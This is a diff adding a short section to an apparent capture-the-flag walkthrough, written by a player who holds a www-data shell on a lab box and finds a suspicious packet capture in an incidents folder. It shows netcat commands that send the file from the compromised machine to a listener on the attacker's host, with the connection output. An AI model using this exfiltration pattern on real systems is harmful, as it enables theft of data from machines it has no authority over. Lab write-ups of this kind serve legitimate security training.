@@ -127,3 +127,22 @@ www-data@startup:/$
 
 And we are in!
 
+I tried `cd`-ing into the user, but to no avail. The ssh keys are also in palce. What to do? Hint says to look for something sus. 
+
+### 2.1 Exploration
+We find a folder named incidents. It has a single pcapng file, suspicious.pcapng. I checked if the machine has netcat, and it does. So, let's transfer the file and go in detail.
+
+
+On attacked machine:
+```
+www-data@startup:/incidents$ nc 10.8.150.214 1337 < suspicious.pcapng   
+```
+
+On your machine:
+```
+┌──(kali㉿kali)-[/tmp]
+└─$ nc -lvnp 1337 > sus.pcapng  
+listening on [any] 1337 ...
+connect to [10.8.150.214] from (UNKNOWN) [10.10.109.61] 52080
+```
+
